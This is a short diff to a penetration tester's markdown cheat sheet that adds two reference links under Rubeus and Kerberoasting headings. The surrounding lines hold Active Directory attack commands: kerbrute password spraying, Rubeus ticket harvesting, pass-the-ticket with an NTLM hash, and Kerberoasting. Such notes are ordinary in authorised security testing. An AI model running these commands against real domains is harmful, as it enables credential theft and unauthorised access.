@@ -11,6 +11,7 @@
 ```./kerbrute_linux_amd64 -domain $DOMAIN -users usernames.txt -passwords passwords.txt -outputfile Output_File```
 
 # Rubeus
+https://www.hackingarticles.in/a-detailed-guide-on-rubeus/
 
 ```Rubeus.exe harvest /interval:30```
 
@@ -19,6 +20,7 @@
 ```Rubeus.exe asktgt /domain:$DOMAIN /user:$DOMAIN_USER /rc4:$NTLM_HASH /ptt```
 
 # Roasting
+https://www.pentestpartners.com/security-blog/how-to-kerberoast-like-a-boss/
 
 ```Rubeus.exe kerberoast /nowrap```
 
